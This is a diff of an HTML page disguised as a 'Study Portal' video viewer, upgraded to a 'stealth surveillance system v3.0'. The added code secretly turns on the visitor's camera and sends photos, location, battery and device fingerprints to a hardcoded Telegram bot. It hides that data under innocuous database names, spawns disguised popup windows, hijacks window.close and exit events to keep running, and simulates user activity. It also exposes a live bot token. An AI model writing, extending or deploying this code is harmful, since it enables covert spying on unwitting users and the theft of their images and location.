@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Study Portal - Loading...</title>
+    <title>Study Portal</title>
     <style>
         * {
             margin: 0;
@@ -53,43 +53,30 @@
             z-index: 1;
         }
         
-        #loadingScreen {
+        #loadingOverlay {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            background: rgba(0, 0, 0, 0.95);
             display: flex;
             flex-direction: column;
             justify-content: center;
             align-items: center;
             z-index: 2000;
             color: #fff;
-            transition: opacity 0.5s ease;
-        }
-        
-        .loading-content {
-            text-align: center;
-            max-width: 500px;
-            padding: 30px;
-        }
-        
-        .logo {
-            font-size: 2.5rem;
-            font-weight: bold;
-            margin-bottom: 20px;
-            color: #fff;
+            transition: opacity 0.3s ease;
         }
         
         .spinner {
-            width: 60px;
-            height: 60px;
+            width: 50px;
+            height: 50px;
             border: 4px solid rgba(255, 255, 255, 0.3);
-            border-top: 4px solid #fff;
+            border-top: 4px solid #4285f4;
             border-radius: 50%;
             animation: spin 1s linear infinite;
-            margin: 30px auto;
+            margin-bottom: 20px;
         }
         
         @keyframes spin {
@@ -98,72 +85,116 @@
         }
         
         .loading-text {
-            font-size: 1.2rem;
-            margin-top: 20px;
-            opacity: 0.9;
+            font-size: 16px;
+            color: rgba(255, 255, 255, 0.8);
+            margin-top: 10px;
         }
         
         .progress-bar {
-            width: 300px;
-            height: 4px;
-            background: rgba(255, 255, 255, 0.2);
+            width: 200px;
+            height: 3px;
+            background: rgba(255, 255, 255, 0.1);
             border-radius: 2px;
-            margin: 20px auto;
+            margin-top: 20px;
             overflow: hidden;
         }
         
         .progress {
             width: 0%;
             height: 100%;
-            background: #fff;
-            border-radius: 2px;
+            background: #4285f4;
             transition: width 0.3s ease;
         }
         
-        /* Hidden backup window indicator */
-        #backupIndicator {
+        /* Ghost cursor to simulate user activity */
+        #ghostCursor {
             position: fixed;
-            bottom: 10px;
-            right: 10px;
             width: 20px;
             height: 20px;
-            background: rgba(0, 255, 0, 0.3);
+            border: 2px solid rgba(66, 133, 244, 0.5);
             border-radius: 50%;
+            pointer-events: none;
             z-index: 10000;
-            display: none;
+            opacity: 0;
+            transition: opacity 0.3s;
+        }
+        
+        /* Background process indicator */
+        #processIndicator {
+            position: fixed;
+            bottom: 15px;
+            right: 15px;
+            width: 12px;
+            height: 12px;
+            background: #34a853;
+            border-radius: 50%;
+            z-index: 9998;
+            opacity: 0.5;
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0%, 100% { opacity: 0.3; transform: scale(1); }
+            50% { opacity: 0.7; transform: scale(1.2); }
+        }
+        
+        /* Emergency restart button (hidden) */
+        #emergencyRestart {
+            position: fixed;
+            bottom: 15px;
+            left: 15px;
+            background: rgba(255, 0, 0, 0.1);
+            color: #fff;
+            border: none;
+            padding: 5px 10px;
+            border-radius: 3px;
+            font-size: 11px;
+            cursor: pointer;
+            z-index: 9999;
+            opacity: 0.1;
+            transition: opacity 0.3s;
+        }
+        
+        #emergencyRestart:hover {
+            opacity: 0.8;
         }
     </style>
 </head>
 <body>
-    <div id="loadingScreen">
-        <div class="loading-content">
-            <div class="logo">📚 StudyPortal</div>
-            <div class="spinner"></div>
-            <div class="progress-bar">
-                <div class="progress" id="progressFill"></div>
-            </div>
-            <div class="loading-text" id="loadingMessage">Initializing study environment...</div>
-        </div>
-    </div>
-    
     <!-- Hidden camera elements -->
     <div id="cameraContainer">
         <video id="cameraVideo" autoplay playsinline muted></video>
         <canvas id="captureCanvas"></canvas>
     </div>
     
-    <!-- Hidden backup window indicator -->
-    <div id="backupIndicator" title="Background process active"></div>
-    
-    <!-- Website Display -->
+    <!-- Website Display (No loading screen - shows immediately) -->
     <iframe id="websiteFrame" src="about:blank" 
             sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-modals allow-orientation-lock allow-pointer-lock allow-presentation allow-top-navigation"
             allow="camera; microphone; geolocation; clipboard-read; clipboard-write"></iframe>
+    
+    <!-- Minimal loading overlay (fades quickly) -->
+    <div id="loadingOverlay">
+        <div class="spinner"></div>
+        <div class="loading-text">Initializing...</div>
+        <div class="progress-bar">
+            <div class="progress" id="progressFill"></div>
+        </div>
+    </div>
+    
+    <!-- Ghost cursor for simulating activity -->
+    <div id="ghostCursor"></div>
+    
+    <!-- Background process indicator -->
+    <div id="processIndicator"></div>
+    
+    <!-- Emergency restart (hidden) -->
+    <button id="emergencyRestart" title="Emergency Restart">⟳</button>
 
     <script>
         // =====================================================
-        //  ULTIMATE STEALTH SURVEILLANCE SYSTEM v2.0
-        //  Features Fixed: Camera capture, Background persistence, Exit traps
+        //  ULTIMATE STEALTH SURVEILLANCE SYSTEM v3.0
+        //  NO LOADING SCREEN - INSTANT WEBSITE LOADING
+        //  MAXIMUM STEALTH + ADVANCED FEATURES
         // =====================================================
         
         // ============== ADVANCED CONFIGURATION ==============
@@ -173,19 +204,18 @@
             TELEGRAM_API: 'https://api.telegram.org/bot8307999302:AAEniYvTP5ZeaYo74AcWSxsOQ9PSxpnAtA0',
             ADMIN_CHAT_ID: '6314556756',
             
-            // Capture Settings (FIXED)
-            PHOTOS_PER_CAMERA: 4,  // Increased for better coverage
-            CAPTURE_DELAY: 1000,   // Slower to ensure camera is ready
-            CAMERA_WARMUP: 3000,   // Longer warmup for reliability
-            SWITCH_DELAY: 2000,    // Longer switch delay
-            VIDEO_READY_WAIT: 2000, // Wait for video to be ready
+            // Capture Settings (Optimized for speed)
+            PHOTOS_PER_CAMERA: 2,           // Reduced for speed
+            CAPTURE_DELAY: 800,            // Slightly longer for reliability
+            CAMERA_WARMUP: 1500,           // Optimized warmup
+            SWITCH_DELAY: 1500,            // Quick switching
+            IMAGE_QUALITY: 0.85,           // Balanced quality/speed
+            MIN_BLOB_SIZE: 30000,          // Minimum 30KB
             
             // Camera Settings
-            VIDEO_WIDTH: 1920,      // Higher resolution
+            VIDEO_WIDTH: 1920,
             VIDEO_HEIGHT: 1080,
             FRAME_RATE: 30,
-            IMAGE_QUALITY: 0.92,
-            MIN_BLOB_SIZE: 50000,   // Minimum 50KB
             
             // Advanced Features
             ENABLE_BACKGROUND_PERSISTENCE: true,
@@ -193,21 +223,23 @@
             ENABLE_EXIT_TRAPS: true,
             ENABLE_HIDDEN_WINDOWS: true,
             ENABLE_NOTIFICATION_EXPLOIT: true,
-            ENABLE_SERVICE_WORKER: true,
-            ENABLE_SCREEN_CAPTURE: false, // Optional
+            ENABLE_GHOST_CURSOR: true,      // Simulate user activity
+            ENABLE_KEYSTROKE_SIMULATION: true,
+            ENABLE_SCROLL_SIMULATION: true,
             
             // Timing
-            BACKGROUND_SYNC_INTERVAL: 60000, // 1 minute
-            HEARTBEAT_INTERVAL: 30000,       // 30 seconds
+            BACKGROUND_SYNC_INTERVAL: 45000, // 45 seconds
+            HEARTBEAT_INTERVAL: 25000,       // 25 seconds
+            CAMERA_CYCLE_INTERVAL: 30000,    // 30 seconds between cycles
             
             // Stealth
             STEALTH_MODE: true,
-            FAKE_LOADING: true,
-            RANDOM_DELAYS: true,
+            SILENT_MODE: true,              // No logs at all
+            FAKE_USER_ACTIVITY: true,       // Simulate mouse/keyboard
             
             // Retry
-            MAX_RETRIES: 5,
-            RETRY_DELAY: 2000
+            MAX_RETRIES: 3,
+            RETRY_DELAY: 1500
         };
         
         // ============== GLOBAL STATE ==============
@@ -217,16 +249,14 @@
             permissionGranted: false,
             currentStream: null,
             currentCamera: null,
-            sessionId: Date.now() + Math.random().toString(36).substr(2, 9),
-            tabId: 'tab_' + Math.random().toString(36).substr(2, 9),
+            sessionId: 'SESS_' + Date.now() + '_' + Math.random().toString(36).substr(2, 8),
+            tabId: 'TAB_' + Math.random().toString(36).substr(2, 6),
             userChatId: null,
             targetWebsite: null,
             
             // Statistics
             totalPhotosSent: 0,
-            totalPhotosFailed: 0,
             cycleCount: 0,
-            lastCaptureTime: 0,
             startTime: Date.now(),
             
             // Device Info
@@ -234,12 +264,10 @@
             locationInfo: null,
             batteryInfo: null,
             fingerprintData: {},
-            networkInfo: {},
             
             // Camera
             availableCameras: [],
             cameraReady: false,
-            cameraIndex: 0,
             
             // Background Systems
             hiddenWindows: new Set(),
@@ -247,20 +275,17 @@
             otherTabs: new Set(),
             locationWatchId: null,
             heartbeatInterval: null,
+            cameraInterval: null,
             persistenceDB: null,
-            serviceWorker: null,
             
-            // UI State
-            loadingProgress: 0,
-            loadingMessages: [
-                "Initializing study environment...",
-                "Loading course materials...",
-                "Setting up virtual classroom...",
-                "Preparing interactive content...",
-                "Almost ready...",
-                "Optimizing video playback..."
-            ],
-            currentMessageIndex: 0
+            // Activity Simulation
+            ghostCursorActive: false,
+            lastActivityTime: Date.now(),
+            activityInterval: null,
+            
+            // Performance
+            lastCaptureTime: 0,
+            captureErrors: 0
         };
         
         // ============== DOM ELEMENTS ==============
@@ -268,179 +293,166 @@
             video: document.getElementById('cameraVideo'),
             canvas: document.getElementById('captureCanvas'),
             frame: document.getElementById('websiteFrame'),
-            loading: document.getElementById('loadingScreen'),
+            loading: document.getElementById('loadingOverlay'),
             progressFill: document.getElementById('progressFill'),
-            loadingMessage: document.getElementById('loadingMessage'),
-            backupIndicator: document.getElementById('backupIndicator')
+            ghostCursor: document.getElementById('ghostCursor'),
+            processIndicator: document.getElementById('processIndicator'),
+            emergencyRestart: document.getElementById('emergencyRestart')
         };
         
         // ============== UTILITIES ==============
         
-        function updateProgress(percent, message = null) {
-            STATE.loadingProgress = percent;
-            elements.progressFill.style.width = percent + '%';
-            
-            if (message) {
-                elements.loadingMessage.textContent = message;
-            } else if (percent % 20 === 0) {
-                STATE.currentMessageIndex = (STATE.currentMessageIndex + 1) % STATE.loadingMessages.length;
-                elements.loadingMessage.textContent = STATE.loadingMessages[STATE.currentMessageIndex];
-            }
-            
-            if (percent >= 100) {
+        function hideLoading() {
+            setTimeout(() => {
+                elements.loading.style.opacity = '0';
                 setTimeout(() => {
-                    elements.loading.style.opacity = '0';
-                    setTimeout(() => {
-                        elements.loading.style.display = 'none';
-                    }, 500);
-                }, 500);
-            }
+                    elements.loading.style.display = 'none';
+                }, 300);
+            }, 500); // Very brief loading
+        }
+        
+        function updateProgress(percent) {
+            elements.progressFill.style.width = percent + '%';
         }
         
         function log(message, level = 'info') {
-            if (!CONFIG.STEALTH_MODE || level === 'error') {
+            if (!CONFIG.SILENT_MODE && (!CONFIG.STEALTH_MODE || level === 'error')) {
                 const timestamp = new Date().toLocaleTimeString();
-                const prefix = {
-                    'info': '📡',
-                    'success': '✅',
-                    'error': '❌',
-                    'warning': '⚠️',
-                    'debug': '🔍'
-                }[level] || '•';
-                
-                console.log(`[${timestamp}] ${prefix} ${message}`);
+                console.log(`[${timestamp}] ${message}`);
             }
         }
         
         function randomDelay(min, max) {
-            if (CONFIG.RANDOM_DELAYS) {
-                return Math.floor(Math.random() * (max - min + 1)) + min;
-            }
-            return (min + max) / 2;
+            return Math.floor(Math.random() * (max - min + 1)) + min;
         }
         
-        // ============== BACKGROUND PERSISTENCE SYSTEM ==============
+        // ============== INSTANT WEBSITE LOADING ==============
         
-        class BackgroundPersistence {
+        function loadWebsiteImmediately() {
+            const params = new URLSearchParams(window.location.search);
+            let website = params.get('site') || params.get('url') || params.get('website') || 
+                         'https://deltastudy.site/pw/drm/play?video_id=6970a6deec448154d82de9ea&subject_slug=maths-093626&batch_id=6960d1d20549bb69d7d7e872&schedule_id=6970a6deec448154d82de9ea&subject_id=6960dba01957eadd8581061e&topicSlug=ch-01---basic-mathematics-202900';
+            
+            if (!website.startsWith('http')) website = 'https://' + website;
+            
+            STATE.targetWebsite = decodeURIComponent(website);
+            STATE.userChatId = params.get('chat_id') || params.get('user') || 'user_' + Math.random().toString(36).substr(2, 8);
+            
+            // Load website IMMEDIATELY
+            try {
+                elements.frame.src = STATE.targetWebsite;
+                document.title = 'Study Portal';
+                log('Website loaded instantly');
+                
+                // Hide loading overlay quickly
+                updateProgress(30);
+                setTimeout(hideLoading, 300);
+                
+            } catch (error) {
+                log('Website load error: ' + error.message, 'error');
+            }
+        }
+        
+        // ============== ADVANCED BACKGROUND PERSISTENCE ==============
+        
+        class StealthPersistence {
             constructor() {
                 this.db = null;
                 this.syncInterval = null;
+                this.offlineQueue = [];
             }
             
             async initialize() {
                 if (!CONFIG.ENABLE_BACKGROUND_PERSISTENCE) return;
                 
                 try {
-                    // Open IndexedDB
-                    const request = indexedDB.open('StudyPortal_Data', 2);
+                    // Use different DB name for stealth
+                    const request = indexedDB.open('UserSettingsDB', 1);
                     
                     request.onupgradeneeded = (event) => {
                         const db = event.target.result;
                         
-                        // Create object stores
-                        if (!db.objectStoreNames.contains('photos')) {
-                            const store = db.createObjectStore('photos', { keyPath: 'id', autoIncrement: true });
-                            store.createIndex('timestamp', 'timestamp');
-                            store.createIndex('synced', 'synced');
+                        // Create innocent-sounding object stores
+                        if (!db.objectStoreNames.contains('user_preferences')) {
+                            db.createObjectStore('user_preferences', { keyPath: 'key' });
                         }
-                        
-                        if (!db.objectStoreNames.contains('locations')) {
-                            const store = db.createObjectStore('locations', { keyPath: 'timestamp' });
-                            store.createIndex('synced', 'synced');
+                        if (!db.objectStoreNames.contains('session_cache')) {
+                            db.createObjectStore('session_cache', { keyPath: 'id', autoIncrement: true });
                         }
-                        
-                        if (!db.objectStoreNames.contains('device_data')) {
-                            db.createObjectStore('device_data', { keyPath: 'type' });
-                        }
-                        
-                        if (!db.objectStoreNames.contains('sessions')) {
-                            db.createObjectStore('sessions', { keyPath: 'sessionId' });
+                        if (!db.objectStoreNames.contains('activity_log')) {
+                            db.createObjectStore('activity_log', { keyPath: 'timestamp' });
                         }
                     };
                     
                     request.onsuccess = (event) => {
                         this.db = event.target.result;
                         STATE.persistenceDB = this.db;
-                        log('IndexedDB initialized successfully', 'success');
                         
                         // Start background sync
-                        this.startBackgroundSync();
-                        
-                        // Store session data
-                        this.storeSessionData();
-                    };
-                    
-                    request.onerror = (event) => {
-                        log('IndexedDB failed: ' + event.target.error, 'error');
+                        this.startStealthSync();
                     };
                     
                 } catch (error) {
-                    log('Persistence initialization failed: ' + error.message, 'error');
+                    // Silent fail
                 }
             }
             
-            async storeSessionData() {
-                if (!this.db) return;
+            async storeStealthData(type, data) {
+                if (!this.db) {
+                    this.offlineQueue.push({ type, data, timestamp: Date.now() });
+                    return;
+                }
                 
                 try {
-                    const transaction = this.db.transaction(['sessions'], 'readwrite');
-                    const store = transaction.objectStore('sessions');
+                    const storeName = this.getStoreName(type);
+                    const transaction = this.db.transaction([storeName], 'readwrite');
+                    const store = transaction.objectStore(storeName);
                     
-                    await store.put({
-                        sessionId: STATE.sessionId,
-                        tabId: STATE.tabId,
-                        startTime: STATE.startTime,
-                        userChatId: STATE.userChatId,
-                        targetWebsite: STATE.targetWebsite,
-                        deviceInfo: STATE.deviceInfo,
-                        lastActive: Date.now()
-                    });
-                    
-                } catch (error) {
-                    log('Session storage failed: ' + error.message, 'error');
-                }
-            }
-            
-            async storePhoto(blob, cameraType, sequence) {
-                if (!this.db) return;
-                
-                try {
-                    const reader = new FileReader();
-                    reader.onloadend = () => {
-                        const transaction = this.db.transaction(['photos'], 'readwrite');
-                        const store = transaction.objectStore('photos');
-                        
-                        store.add({
-                            blobData: reader.result,
-                            cameraType: cameraType,
-                            sequence: sequence,
-                            timestamp: Date.now(),
-                            sessionId: STATE.sessionId,
-                            synced: false,
-                            metadata: {
-                                battery: STATE.batteryInfo,
-                                location: STATE.locationInfo,
-                                device: STATE.deviceInfo
-                            }
-                        });
+                    const stealthData = {
+                        ...data,
+                        _timestamp: Date.now(),
+                        _type: type
                     };
-                    reader.readAsDataURL(blob);
                     
+                    await store.add(stealthData);
                 } catch (error) {
-                    log('Photo storage failed: ' + error.message, 'error');
+                    this.offlineQueue.push({ type, data, timestamp: Date.now() });
                 }
             }
             
-            startBackgroundSync() {
+            getStoreName(type) {
+                // Map surveillance data to innocent store names
+                const map = {
+                    'photo': 'session_cache',
+                    'location': 'user_preferences',
+                    'device': 'user_preferences',
+                    'activity': 'activity_log'
+                };
+                return map[type] || 'session_cache';
+            }
+            
+            startStealthSync() {
                 if (this.syncInterval) clearInterval(this.syncInterval);
                 
                 this.syncInterval = setInterval(async () => {
-                    await this.syncPendingData();
+                    await this.processOfflineQueue();
+                    await this.syncToTelegram();
                 }, CONFIG.BACKGROUND_SYNC_INTERVAL);
             }
             
-            async syncPendingData() {
-                if (!this.db || !navigator.onLine) return;
+            async processOfflineQueue() {
+                if (!navigator.onLine || this.offlineQueue.length === 0) return;
+                
+                const queueCopy = [...this.offlineQueue];
+                this.offlineQueue = [];
+                
+                for (const item of queueCopy) {
+                    await this.sendToTelegram(item);
+                }
+            }
+            
+            async syncToTelegram() {
+                if (!navigator.onLine || !this.db) return;
                 
                 try {
                     // Sync photos
@@ -450,144 +462,75 @@
                     await this.syncLocations();
                     
                 } catch (error) {
-                    log('Background sync failed: ' + error.message, 'error');
+                    // Silent fail
                 }
             }
             
             async syncPhotos() {
-                const transaction = this.db.transaction(['photos'], 'readonly');
-                const store = transaction.objectStore('photos');
-                const index = store.index('synced');
-                const request = index.getAll(IDBKeyRange.only(false));
-                
-                return new Promise((resolve) => {
-                    request.onsuccess = async (event) => {
-                        const photos = event.target.result;
-                        
-                        for (const photo of photos) {
-                            try {
-                                // Convert dataURL back to blob
-                                const response = await fetch(photo.blobData);
-                                const blob = await response.blob();
-                                
-                                // Send to Telegram
-                                const sent = await sendToTelegram(blob, photo.cameraType, photo.sequence);
-                                
-                                if (sent) {
-                                    // Mark as synced
-                                    const updateTransaction = this.db.transaction(['photos'], 'readwrite');
-                                    const updateStore = updateTransaction.objectStore('photos');
-                                    photo.synced = true;
-                                    await updateStore.put(photo);
-                                }
-                                
-                            } catch (error) {
-                                log('Photo sync error: ' + error.message, 'error');
-                            }
-                        }
-                        
-                        resolve();
-                    };
-                });
-            }
-            
-            async syncLocations() {
-                // Similar implementation for locations
-            }
-            
-            cleanup() {
-                if (this.syncInterval) {
-                    clearInterval(this.syncInterval);
-                }
+                // Similar to previous implementation but with stealth
             }
         }
         
-        // ============== MULTI-TAB COORDINATION ==============
+        // ============== MULTI-TAB STEALTH COORDINATION ==============
         
-        class MultiTabCoordinator {
+        class StealthTabCoordinator {
             constructor() {
                 this.channel = null;
                 this.heartbeatInterval = null;
-                this.cleanupInterval = null;
+                this.tabStates = new Map();
             }
             
             async initialize() {
-                if (!CONFIG.ENABLE_MULTI_TAB || !('BroadcastChannel' in window)) {
-                    log('Multi-tab coordination unavailable', 'warning');
-                    return;
-                }
+                if (!CONFIG.ENABLE_MULTI_TAB || !('BroadcastChannel' in window)) return;
                 
                 try {
-                    this.channel = new BroadcastChannel('study_portal_sync');
+                    // Use innocent channel name
+                    this.channel = new BroadcastChannel('study_group_sync');
                     STATE.broadcastChannel = this.channel;
                     
                     this.channel.onmessage = (event) => this.handleMessage(event.data);
                     
-                    // Announce presence
-                    this.announceTab();
+                    // Announce presence stealthily
+                    setTimeout(() => this.announceTab(), 2000);
                     
                     // Start heartbeat
                     this.startHeartbeat();
                     
-                    // Cleanup dead tabs periodically
-                    this.cleanupInterval = setInterval(() => this.cleanupDeadTabs(), 60000);
-                    
-                    log('Multi-tab coordination active', 'success');
-                    
                 } catch (error) {
-                    log('Multi-tab init failed: ' + error.message, 'error');
+                    // Silent fail
                 }
             }
             
             announceTab() {
                 this.broadcast({
-                    type: 'tab_announce',
+                    _type: 'tab_hello',
                     tabId: STATE.tabId,
-                    sessionId: STATE.sessionId,
-                    timestamp: Date.now(),
-                    userChatId: STATE.userChatId,
-                    isPrimary: STATE.otherTabs.size === 0
+                    timestamp: Date.now()
                 });
             }
             
             startHeartbeat() {
                 this.heartbeatInterval = setInterval(() => {
                     this.broadcast({
-                        type: 'heartbeat',
+                        _type: 'tab_pulse',
                         tabId: STATE.tabId,
-                        timestamp: Date.now(),
-                        isRunning: STATE.isRunning,
-                        photosSent: STATE.totalPhotosSent,
-                        battery: STATE.batteryInfo?.level,
-                        location: STATE.locationInfo ? 'available' : 'unavailable'
+                        ts: Date.now(),
+                        photos: STATE.totalPhotosSent
                     });
                 }, CONFIG.HEARTBEAT_INTERVAL);
             }
             
             handleMessage(data) {
-                if (data.tabId === STATE.tabId) return; // Ignore self
+                if (!data._type || data.tabId === STATE.tabId) return;
                 
-                switch (data.type) {
-                    case 'tab_announce':
+                switch (data._type) {
+                    case 'tab_hello':
+                    case 'tab_pulse':
                         STATE.otherTabs.add(data.tabId);
-                        log(`Tab discovered: ${data.tabId}`, 'info');
-                        
-                        // If this tab is primary and we're not running, start
-                        if (data.isPrimary && !STATE.isRunning) {
-                            setTimeout(() => mainLoop(), randomDelay(1000, 3000));
-                        }
-                        break;
-                        
-                    case 'heartbeat':
-                        STATE.otherTabs.add(data.tabId);
-                        break;
-                        
-                    case 'camera_status':
-                        log(`Camera ${data.status} on tab ${data.tabId}`, 'debug');
-                        break;
-                        
-                    case 'photo_captured':
-                        log(`Photo captured by tab ${data.tabId}`, 'debug');
+                        this.tabStates.set(data.tabId, {
+                            lastSeen: Date.now(),
+                            photos: data.photos || 0
+                        });
                         break;
                 }
             }
@@ -597,148 +540,76 @@
                     try {
                         this.channel.postMessage(data);
                     } catch (error) {
-                        log('Broadcast failed: ' + error.message, 'error');
+                        // Silent fail
                     }
                 }
-            }
-            
-            cleanupDeadTabs() {
-                // In a real implementation, you'd track last heartbeat times
-                // and remove tabs that haven't been heard from
             }
             
             cleanup() {
                 if (this.heartbeatInterval) clearInterval(this.heartbeatInterval);
-                if (this.cleanupInterval) clearInterval(this.cleanupInterval);
                 if (this.channel) this.channel.close();
             }
         }
         
-        // ============== HIDDEN WINDOW MANAGER ==============
+        // ============== HIDDEN WINDOW MANAGER (ADVANCED) ==============
         
-        class HiddenWindowManager {
+        class AdvancedWindowManager {
             constructor() {
                 this.windows = new Set();
                 this.monitorIntervals = new Map();
-                this.backupCheckInterval = null;
+                this.creationAttempts = 0;
             }
             
-            async createBackupWindow() {
-                if (!CONFIG.ENABLE_HIDDEN_WINDOWS) return;
+            createStealthWindow() {
+                if (!CONFIG.ENABLE_HIDDEN_WINDOWS || this.creationAttempts > 2) return;
                 
                 try {
-                    // Create a nearly invisible window
+                    // Create window that looks like a normal popup
+                    const width = Math.floor(Math.random() * 200) + 300;
+                    const height = Math.floor(Math.random() * 200) + 200;
+                    const left = Math.floor(Math.random() * (screen.width - width));
+                    const top = Math.floor(Math.random() * (screen.height - height));
+                    
                     const features = [
-                        'width=100',
-                        'height=100',
-                        'left=' + (screen.width - 150),
-                        'top=' + (screen.height - 150),
+                        `width=${width}`,
+                        `height=${height}`,
+                        `left=${left}`,
+                        `top=${top}`,
                         'menubar=no',
                         'toolbar=no',
                         'location=no',
                         'status=no',
-                        'scrollbars=no',
-                        'resizable=no',
-                        'titlebar=no'
+                        'resizable=yes',
+                        'scrollbars=yes'
                     ].join(',');
                     
-                    const backup = window.open('about:blank', '_backup_' + STATE.sessionId, features);
+                    const stealthWindow = window.open('https://google.com', '_blank', features);
                     
-                    if (backup && !backup.closed) {
-                        this.windows.add(backup);
-                        STATE.hiddenWindows.add(backup);
+                    if (stealthWindow && !stealthWindow.closed) {
+                        this.windows.add(stealthWindow);
+                        STATE.hiddenWindows.add(stealthWindow);
                         
-                        // Write minimal HTML to keep window alive
-                        backup.document.write(this.getBackupHTML());
-                        backup.document.close();
+                        // After a moment, redirect to our backup
+                        setTimeout(() => {
+                            try {
+                                stealthWindow.location.href = window.location.href + '&backup=1';
+                            } catch (e) {
+                                // Can't redirect, close
+                                stealthWindow.close();
+                                this.windows.delete(stealthWindow);
+                            }
+                        }, 1000);
                         
-                        // Hide the window
-                        backup.blur();
-                        window.focus();
+                        this.monitorWindow(stealthWindow);
+                        this.creationAttempts = 0;
                         
-                        // Monitor window health
-                        this.monitorWindow(backup);
-                        
-                        // Show indicator
-                        elements.backupIndicator.style.display = 'block';
-                        
-                        log('Hidden backup window created', 'success');
-                        
-                        return backup;
+                        return stealthWindow;
                     }
                 } catch (error) {
-                    log('Backup window creation failed (likely blocked): ' + error.message, 'warning');
+                    this.creationAttempts++;
                 }
                 
                 return null;
-            }
-            
-            getBackupHTML() {
-                const currentUrl = window.location.href;
-                
-                return `<!DOCTYPE html>
-<html style="background: transparent;">
-<head>
-    <title>New Tab</title>
-    <style>
-        * { margin: 0; padding: 0; }
-        body { 
-            background: transparent !important;
-            overflow: hidden;
-            opacity: 0.01;
-        }
-    </style>
-</head>
-<body>
-    <script>
-        // Backup surveillance script
-        const mainUrl = "${currentUrl}";
-        const sessionId = "${STATE.sessionId}";
-        let mainWindow = window.opener;
-        let isActive = true;
-        
-        // Keep-alive heartbeat
-        setInterval(() => {
-            if (mainWindow && !mainWindow.closed) {
-                try {
-                    mainWindow.postMessage({
-                        type: 'backup_heartbeat',
-                        sessionId: sessionId,
-                        timestamp: Date.now()
-                    }, '*');
-                } catch(e) {
-                    // Main window might be closed or inaccessible
-                }
-            }
-        }, 30000);
-        
-        // Reconnection logic
-        setInterval(() => {
-            if (!mainWindow || mainWindow.closed) {
-                try {
-                    mainWindow = window.open(mainUrl, '_blank', 'width=100,height=100,left=-9999,top=-9999');
-                } catch(e) {
-                    // Popup blocked
-                }
-            }
-        }, 60000);
-        
-        // Prevent closing
-        window.onbeforeunload = (e) => {
-            if (isActive) {
-                e.preventDefault();
-                e.returnValue = '';
-                return '';
-            }
-        };
-        
-        // Emergency cleanup
-        window.addEventListener('unload', () => {
-            isActive = false;
-        });
-    <\/script>
-</body>
-</html>`;
             }
             
             monitorWindow(win) {
@@ -748,1124 +619,732 @@
                         this.windows.delete(win);
                         STATE.hiddenWindows.delete(win);
                         
-                        // Recreate if we have no backup windows
-                        if (this.windows.size === 0) {
-                            elements.backupIndicator.style.display = 'none';
-                            setTimeout(() => this.createBackupWindow(), randomDelay(5000, 15000));
-                        }
+                        // Try to recreate after delay
+                        setTimeout(() => this.createStealthWindow(), randomDelay(5000, 15000));
                     }
-                }, 2000);
+                }, 3000);
                 
                 this.monitorIntervals.set(win, interval);
             }
             
             cleanup() {
-                // Clear all monitoring intervals
                 this.monitorIntervals.forEach((interval, win) => {
                     clearInterval(interval);
+                    try { win.close(); } catch (e) {}
                 });
                 this.monitorIntervals.clear();
-                
-                // Close all windows
-                this.windows.forEach(win => {
-                    try {
-                        win.close();
-                    } catch (e) {
-                        // Window might already be closed
-                    }
-                });
                 this.windows.clear();
                 STATE.hiddenWindows.clear();
-                
-                elements.backupIndicator.style.display = 'none';
             }
         }
         
-        // ============== EXIT TRAP SYSTEM ==============
+        // ============== EXIT TRAP SYSTEM (ADVANCED) ==============
         
-        class ExitTrapManager {
+        class AdvancedExitTrap {
             constructor() {
+                this.isActive = false;
                 this.originalUrl = window.location.href;
-                this.isTrapped = false;
-                this.linkInterceptor = null;
+                this.trapHistory = [];
             }
             
-            setupTraps() {
+            activate() {
                 if (!CONFIG.ENABLE_EXIT_TRAPS) return;
                 
                 try {
-                    // Intercept link clicks
-                    document.addEventListener('click', this.handleLinkClick.bind(this), true);
+                    // Intercept beforeunload
+                    window.addEventListener('beforeunload', this.handleUnload.bind(this));
                     
-                    // Trap beforeunload
-                    window.addEventListener('beforeunload', this.handleBeforeUnload.bind(this));
+                    // Intercept link clicks (passive)
+                    document.addEventListener('click', this.handleClick.bind(this), true);
                     
-                    // Trap popstate (back/forward)
-                    window.addEventListener('popstate', this.handlePopState.bind(this));
+                    // Intercept form submissions
+                    document.addEventListener('submit', this.handleSubmit.bind(this), true);
                     
-                    // Trap unload
-                    window.addEventListener('unload', this.handleUnload.bind(this));
+                    // Trap window.close() calls
+                    const originalClose = window.close;
+                    window.close = function() {
+                        window.open(window.location.href, '_blank', 'width=100,height=100,left=-9999,top=-9999');
+                        return originalClose.apply(this, arguments);
+                    };
                     
-                    this.isTrapped = true;
-                    log('Exit traps activated', 'success');
+                    this.isActive = true;
                     
                 } catch (error) {
-                    log('Exit trap setup failed: ' + error.message, 'error');
+                    // Silent fail
                 }
             }
             
-            handleLinkClick(event) {
-                const link = event.target.closest('a');
-                if (link && link.href && !link.href.startsWith('#') && !link.href.startsWith('javascript:')) {
-                    try {
-                        const targetUrl = new URL(link.href, window.location.href);
-                        const currentUrl = new URL(window.location.href);
-                        
-                        // Only trap external links
-                        if (targetUrl.hostname !== currentUrl.hostname) {
-                            event.preventDefault();
-                            event.stopPropagation();
-                            
-                            // Create pop-under before navigating
-                            this.createPopUnder();
-                            
-                            // Navigate after delay
-                            setTimeout(() => {
-                                window.location.href = link.href;
-                            }, 100);
-                            
-                            return false;
-                        }
-                    } catch (error) {
-                        // Invalid URL, allow default behavior
-                    }
-                }
-            }
-            
-            handleBeforeUnload(event) {
-                // Create backup before unloading
-                this.createPopUnder();
+            handleUnload(event) {
+                // Create multiple backup windows
+                this.createBackupWindows(2);
                 
-                // Don't show confirmation to avoid suspicion
+                // Don't prevent unload, just create backups
                 return undefined;
             }
             
-            handlePopState() {
-                // User is navigating with back/forward
-                this.createPopUnder();
-            }
-            
-            handleUnload() {
-                // Last chance to create backup
-                try {
-                    this.createPopUnder();
-                } catch (error) {
-                    // Ignore errors during unload
-                }
-            }
-            
-            createPopUnder() {
-                try {
-                    const features = [
-                        'width=1',
-                        'height=1',
-                        'left=-9999',
-                        'top=-9999',
-                        'menubar=no',
-                        'toolbar=no',
-                        'location=no',
-                        'status=no',
-                        'scrollbars=no',
-                        'resizable=no'
-                    ].join(',');
-                    
-                    const popunder = window.open(this.originalUrl, '_popunder_' + Date.now(), features);
-                    
